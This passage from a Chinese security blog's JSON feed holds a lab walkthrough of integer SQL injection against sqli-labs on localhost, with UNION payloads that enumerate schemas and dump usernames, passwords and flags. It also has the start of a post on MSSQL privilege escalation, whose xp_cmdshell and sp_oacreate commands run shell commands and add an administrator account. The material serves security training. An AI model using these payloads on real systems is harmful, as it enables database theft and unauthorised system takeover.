注入步骤</h2>\n<h3 id=\"1判断是否有注入判断是否未严格校验\"><a class=\"markdownIt-Anchor\" href=\"#1判断是否有注入判断是否未严格校验\">#</a> ①判断是否有注入 (判断是否未严格校验)</h3>\n<h4 id=\"1可控参数的改变能否影响页面的显示结果\"><a class=\"markdownIt-Anchor\" href=\"#1可控参数的改变能否影响页面的显示结果\">#</a> 1) 可控参数的改变能否影响页面的显示结果</h4>\n<p>网页让输入 id，可是我们并没有看到交互框，因此猜测有可能是需要发送请求。</p>\n<p>点击查看网页源代码，在 Network 这里看到是 GET 请求。</p>\n<p><img src=\"image-20220928213756712.png\" alt=\"image-20220928213756712\"></p>\n<p>因此我们选择在链接后面加上 id 参数</p>\n<p><img src=\"image-20220928213510534.png\" alt=\"image-20220928213510534\"></p>\n<p>发现成功令其输出内容。</p>\n<p>此时我们再次改变 GET 请求中 id 的值，发现，内容会对应有所变化。</p>\n<p><img src=\"image-20220928214022889.png\" alt=\"image-20220928214022889\"></p>\n<h4 id=\"2输入的sql语句是否能报错\"><a class=\"markdownIt-Anchor\" href=\"#2输入的sql语句是否能报错\">#</a> 2) 输入的 SQL 语句是否能报错</h4>\n<p>因为能通过数据库的报错，看到数据库的一些语句痕迹</p>\n<p>我们假设它后台的查询语句是</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> $id</span><br></pre></td></tr></table></figure>\n<p>猜想：能否通过加单引号令其出错？</p>\n<p>因为：</p>\n<p>如果是整型注入漏洞，则像 3’这样的字符传入 $id 处会引发错误。</p>\n<p>如果是单引号注入漏洞，像 3’这样的字符传入 $id 处也会引发错误。</p>\n<p><img src=\"image-20220928214501924.png\" alt=\"image-20220928214501924\"></p>\n<p>黄字部分的报错语句，非常之重要！</p>\n<p>near ‘xxxxxxxxxx’ at line 1 是在告诉我们在第 1 行的 xxxxxxx 语句处出现错误，而我们通过加入单引号使其发生错误，错误信息就会帮我们显示了出错的局部代码，也就是 “输出了单引号后面的语句”——LIMIT 0,1。</p>\n<p>为了再次确定 near ‘xxxxxxxxxx’ at line 1 中在 LIMIT 0,1 之前的一个单引号是我们输入的单引号，我们再次改变 GET 请求中 &quot;’ '&quot;（单引号）变为 &quot;&quot;&quot;（双引号）</p>\n<p><img src=\"image-20220928215359897.png\" alt=\"image-20220928215359897\"></p>\n<p>发现成功令报错信息中 near 'xxxxx’中的 LIMIT 前一个符号发生改变。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，加入单引号会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; limit 0,1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#如果是单引号注入，加入单引号也会报错</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27;&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>据目前输入的结果来看，此网页存在 “整型注入” 或者 “单引号注入”</p>\n<h4 id=\"3输入的sql语句能否不报错\"><a class=\"markdownIt-Anchor\" href=\"#3输入的sql语句能否不报错\">#</a> 3) 输入的 SQL 语句能否不报错</h4>\n<p>为了查看我们的语句能够成功闭合</p>\n<p>那怎么区分到底是整型还是单引号呢？</p>\n<p>使用 # 来注释后面语句</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#加入#号后，两个语法依旧错误，故都会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; # limit 0,1</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27; #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>结果确实是报错。</p>\n<p><img src=\"image-20220928220327744.png\" alt=\"image-20220928220327744\"></p>\n<p>接下来我们删掉单引号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，则删掉单引号，保留#号后，不会报错！</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> # limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">#如果是单引号注入，则删掉单引号，保留#号后，依旧会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"string\">&#x27;2 #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928220529170.png\" alt=\"image-20220928220529170\"></p>\n<h3 id=\"2什么类型的注入\"><a class=\"markdownIt-Anchor\" href=\"#2什么类型的注入\">#</a> ②什么类型的注入</h3>\n<p>因此，此处经过上述报错信息确定，存在<strong>整型注入</strong>！</p>\n<h3 id=\"3语句是否能够被恶意修改\"><a class=\"markdownIt-Anchor\" href=\"#3语句是否能够被恶意修改\">#</a> ③语句是否能够被恶意修改</h3>\n<p>恶意修改主要指能否再加入一些我们想要的判断条件，比如：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span># limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>如果是整型注入无误，这里条件为 “id = 2 and 0”—— 这是永假条件，则不会有任何查询结果。</p>\n<p><img src=\"image-20220928221547372.png\" alt=\"image-20220928221547372\"></p>\n<p>结果正如我们所料，空空如也。</p>\n<h3 id=\"4是否能够成功执行\"><a class=\"markdownIt-Anchor\" href=\"#4是否能够成功执行\">#</a> ④是否能够成功执行</h3>\n<p>第三个能满足，其实第四个就顺带就 OK。</p>\n<h3 id=\"5获取我们想要的数据\"><a class=\"markdownIt-Anchor\" href=\"#5获取我们想要的数据\">#</a> ⑤获取我们想要的数据</h3>\n<p>关键数据是保存在数据库里面的，关系如下：</p>\n<p>数据库 -&gt; 表 -&gt; 字段 -&gt; 值</p>\n<p>打开 MySQL，我们可以看到其中有 information_schema 库（这是 MySQL 自带的库，管理所有表信息）</p>\n<p><img src=\"image-20220928223622076.png\" alt=\"image-20220928223622076\"></p>\n<p>这个库中有三个表非常值得我们关注：</p>\n<p>Schemata 表（包含所有的 <code>库名信息</code> ）、Tables 表（包含所有的 <code>表名信息</code> ）、Columns 表（包含所有的 <code>列名信息</code> ）</p>\n<p><strong>首先是 Schemeta 表</strong>， <code>schema_name</code>  对应着所有数据库的名字。</p>\n<p><img src=\"image-20220928224006640.png\" alt=\"image-20220928224006640\"></p>\n<p><strong>其次是 Tables 表</strong>， <code>table_name</code>  这个列里，存储了 <code>table_schema对应的库</code> 下面的所有表</p>\n<p><img src=\"image-20220928224135720.png\" alt=\"image-20220928224135720\"></p>\n<p><strong>最后是 Columns 表</strong>，通过 <code>table_schema</code>  对应的库， <code>table_name</code>  对应的表，<strong>使用 column_name 对应的列名，来唯一地定位某个列</strong>。</p>\n<p><img src=\"image-20220928224405698.png\" alt=\"image-20220928224405698\"></p>\n<h4 id=\"1构造联合查询\"><a class=\"markdownIt-Anchor\" href=\"#1构造联合查询\">#</a> 1）构造联合查询</h4>\n<p>确定的整型注入中，我们需要构造出我们想要的查询内容，比如在<strong> information_schema 库</strong>的<strong> Schema 表</strong>中获取 <code>schema_name</code> ：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225341595.png\" alt=\"image-20220928225341595\"></p>\n<p>但如果像上面这样构造，会报错，我们需要使用到联合查询。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225106827.png\" alt=\"image-20220928225106827\"></p>\n<p>但是，如果像上面这样构造，依旧会报错，在 SQL 查询中，union 前后的两个列 ++<strong> 需要列数完全一致才可拼接</strong> ++。</p>\n<p>因此，需要使用占位符来定位前面的查询是多少列：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#占位一个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span> #</span><br><span class=\"line\">#占位两个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span> #</span><br><span class=\"line\">#占位三个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> #</span><br><span class=\"line\">....</span><br></pre></td></tr></table></figure>\n<p>注意，这里的 1,2,3 可以填任何数字或者符号，仅仅为了占位使用，<strong>可以被任意 “想要看到的输出内容” 覆盖</strong>。</p>\n<p>经过多次定位，我们最终得到：<strong>前面的查询</strong>使用到的是<strong> 3 个列</strong>。</p>\n<p><img src=\"image-20220928225313035.png\" alt=\"image-20220928225313035\"></p>\n<p>因此有：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225608030.png\" alt=\"image-20220928225608030\"></p>\n<p>虽然正确显示，但是我们查询的内容并没有显示出来。这是因为，使用 union 查询，<strong>还有个 bug</strong> 就是如果前面的查询有效，<strong>最终结果会在前面查询到的结尾后面拼接</strong>。</p>\n<p>为了让后面查询到的内容（我们 <code>想要看到的数据</code> ）提前，<strong>我们需要令前面的查询失效</strong>，简单的方法就是令 id = 39888 这样平常不会使用的奇怪数字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225926603.png\" alt=\"image-20220928225926603\"></p>\n<h4 id=\"2拼接多组内容在同一行输出-寻找所在库\"><a class=\"markdownIt-Anchor\" href=\"#2拼接多组内容在同一行输出-寻找所在库\">#</a> 2）拼接多组内容在同一行输出、寻找所在库</h4>\n<p>OK，我们在第二个占位符（也就是数字 2 所在的位置）上，看到输出了一个 schema_name，但是我们想要输出所有的 schema_name，怎么办？</p>\n<p>使用 MySQL 查询语句提供的 group_concat () 函数</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>可以看到，原本占位符 2 所在的位置，已经被一组输出内容所替换。</p>\n<p><img src=\"image-20220928230746841.png\" alt=\"image-20220928230746841\"></p>\n<p>除了 group_concat ()，我们还可以使用：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#输出当前使用数据库的名称</span><br><span class=\"line\">database() </span><br><span class=\"line\">#输出当前服务器中使用数据库的用户的名字和其对应的主机</span><br><span class=\"line\"><span class=\"keyword\">user</span>()</span><br><span class=\"line\">#输出当前数据库版本号</span><br><span class=\"line\">version()</span><br><span class=\"line\">#输出该服务器数据库安装路径（数据库安装在哪里）</span><br><span class=\"line\">@<span class=\"variable\">@basedir</span></span><br><span class=\"line\">#输出数据库中数据的存放路径（该存放路径下有各个数据库的数据、数据库中表的数据）</span><br><span class=\"line\">@<span class=\"variable\">@datadir</span></span><br><span class=\"line\">#输出操作系统的版本号</span><br><span class=\"line\">@<span class=\"variable\">@version</span>_compile_os</span><br><span class=\"line\">#md5(str)可以对传入的字符串进行，d5加密，并返回加密后得到的<span class=\"number\">32</span>位字符串。</span><br><span class=\"line\">md5(<span class=\"string\">&#x27;xxxx&#x27;</span>)</span><br><span class=\"line\">#使用某个拼接符如“:”来拼接str1和str2</span><br><span class=\"line\">concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, str1, str2)</span><br></pre></td></tr></table></figure>\n<p>接着我们查询所在数据库的名字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), database() <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>哦，原来是在 security 数据库中</p>\n<p><img src=\"image-20220928231402676.png\" alt=\"image-20220928231402676\"></p>\n<h4 id=\"3确定想从某个库中拿到什么表从表中拿到什么列\"><a class=\"markdownIt-Anchor\" href=\"#3确定想从某个库中拿到什么表从表中拿到什么列\">#</a> 3）确定想从某个库中拿到什么表，从表中拿到什么列</h4>\n<p>我们看看从 security 库中都可以读取什么表？</p>\n<p><strong>核心</strong> —— 在<strong> information_schema 库</strong>的<strong> Tables 表</strong>中，查询当 table_schema 的值为我们刚刚获取的 security 库时</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(table_name), database() <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928231639522.png\" alt=\"image-20220928231639522\"></p>\n<p><strong>获取到 security 库中的所有表为</strong>： <code>emails</code> 、 <code>referers</code> 、 <code>uagents</code> 、 <code>users</code></p>\n<p>我们比较关心账号密码相关，所以眼光聚焦到 users 表。</p>\n<p><strong>核心</strong> —— 在<strong> information_schema 库</strong>的<strong> Columns 表</strong>中，查询当<strong> table_schema</strong> 的值为我们刚刚获取的 <code>security</code>  且 <strong>table_name</strong> 为 <code>users</code>  时</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(column_name), database() <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() <span class=\"keyword\">and</span> table_name <span class=\"operator\">=</span> <span class=\"string\">&#x27;users&#x27;</span> #</span><br></pre></td></tr></table></figure>\n<p><strong>获取到 security 库中，users 表里所有列为</strong>： <code>id</code> 、 <code>username</code> 、 <code>password</code></p>\n<p><img src=\"image-20220928232355430.png\" alt=\"image-20220928232355430\"></p>\n<p>我们想要获取 username 和 password 的全部对应关系，使用 concat_ws 函数，把 username 和 password 用冒号拼接起来：</p>\n<p><strong>核心</strong> —— 由于已经知道了所在<strong> security 库</strong>，<strong>users 表</strong>，因此直接 <code>select xxxx from security.users</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, username, password)), <span class=\"number\">3</span> <span class=\"keyword\">from</span> security.users #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928232842359.png\" alt=\"image-20220928232842359\"></p>\n<p>小练习</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">1.</span>查看注入类型</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; # 报错(整型和单引号都会报错)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#2.确定整型注入</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 # (只有整型不会报错)</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#3.确定列数</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 union select 1, 2, 3 #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#4.构造联合查询,确定所在库名。</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), schema_name from information_schema.schemata #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: information_schema</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#5.确定在这个库中，都有什么表</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(table_name) from information_schema.tables where table_schema = database()#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: emails,flag,users</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#6.确定我们要找flag表，并看这个表中有什么列</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>flag<span class=\"string\">&#x27;#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag,value</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#7.取列的值，另外把查询的from 后面改成对应的&quot;库.表&quot;</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=2356 union select 1,database(), group_concat(concat_ws(&#x27;</span>:<span class=\"string\">&#x27;, flag, value)) from challenge.flag#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:any,flag8:sqlc,flag9:tasi,flag10:moo,flag12:false,flag11:muse</span></span><br></pre></td></tr></table></figure>\n<p>至此，整型注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "url": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "title": "MSSQL提权攻击",
            "date_published": "2022-09-27T14:46:06.000Z",
            "content_html": "<h1 id=\"sql-servermssql提权\"><a class=\"markdownIt-Anchor\" href=\"#sql-servermssql提权\">#</a> SQL Server（MSSQL）提权</h1>\n<p>总结一下，下文使用有效命令全部为：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--1.xp_cmdshell提权</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\">#master..xp_cmdshell的全写是master.dbo.xp_cmdshell</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net user HeyJack HeyJack /add&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net localgroup administrators HeyJack /add&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;ipconfig&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;type C:\\Documents and Settings\\桌面\\flag.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"comment\">--恢复语句</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span> ,<span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--2.sp_oacreate提权</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ole Automation Procedures&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"variable\">@shell</span> <span class=\"type\">int</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net user HeyJack1 HeyJack1 /add&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"variable\">@shell</span> <span class=\"type\">int</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net localgroup administrators HeyJack1 /add&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">--恢复语句</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ole Automation Procedures&#x27;</span>, <span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--3.沙盒提权(不常用，所以没粘贴出来)</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01-环境准备\"><a class=\"markdownIt-Anchor\" href=\"#0x01-环境准备\">#</a> 0x01 环境准备</h2>\n<p>输入用户名和密码，以 <code>sa</code>  身份登录 SQL Server2005</p>\n<p><img src=\"image-20220927205858375.png\" alt=\"image-20220927205858375\"></p>\n<p>登录后可以看到这样的界面</p>\n<p><img src=\"image-20220927210049933.png\" alt=\"image-20220927210049933\"></p>\n<p>首先我们了解下什么是 sp_configure？</p>\n<p><img src=\"image-20220927210431221.png\" alt=\"image-20220927210431221\"></p>\n<p>其中，在列出高级配置选项的例子中，官网显示了如何设置和列出所有配置选项：首先就是要设置 <code>show advanced options</code>  为 <code>1</code> ，可以显示高级选项。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">USE master;  </span><br><span class=\"line\">GO  </span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> 